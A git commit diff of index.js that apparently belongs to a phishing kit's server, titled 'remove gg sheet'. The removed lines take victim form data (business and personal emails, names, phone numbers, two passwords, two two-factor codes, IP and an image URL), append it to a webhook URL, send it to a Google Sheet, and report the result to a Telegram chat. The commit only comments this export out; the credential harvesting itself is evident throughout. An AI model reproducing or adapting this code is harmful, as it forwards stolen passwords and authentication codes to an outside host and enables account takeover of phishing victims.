475dfc4bacd6aab5a849ac1446cc8ced4c5b4efe
luciannguyenanh <160406854+luciannguyenanh@users.noreply.github.com>
2024-02-18 21:06:06 +0700

    remove gg sheet

--- index.js
+++ index.js
@@ -40,31 +40,31 @@ const message = `IP: ${data.ip ? data.ip : ''}
 
 
     // ADD GOOGLE SHEET
-    const url = new URL(process.env.WEBHOOK_URL);
+    // const url = new URL(process.env.WEBHOOK_URL);
 
-    url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
-    url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
-    url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
-    url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
-    url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
-    url.searchParams.append('Password First', data.first_password ? data.first_password : '');
-    url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
-    url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
-    url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
-    url.searchParams.append('Images Url', data.image ? data.image : '');
+    // url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
+    // url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
+    // url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
+    // url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
+    // url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
+    // url.searchParams.append('Password First', data.first_password ? data.first_password : '');
+    // url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
+    // url.searchParams.append('Ip', data.ip ? data.ip : '');
+    // url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
+    // url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
+    // url.searchParams.append('Images Url', data.image ? data.image : '');
 
-    axios.get(url)
-        .then(response => {
-            if (response.data.status === 'success') {
-                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-            } else {
-                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-            }
-        })
-        .catch(error => {
-            bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-        });
+    // axios.get(url)
+    //     .then(response => {
+    //         if (response.data.status === 'success') {
+    //             bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+    //         } else {
+    //             bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+    //         }
+    //     })
+    //     .catch(error => {
+    //         bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    //     });
 
 });
 
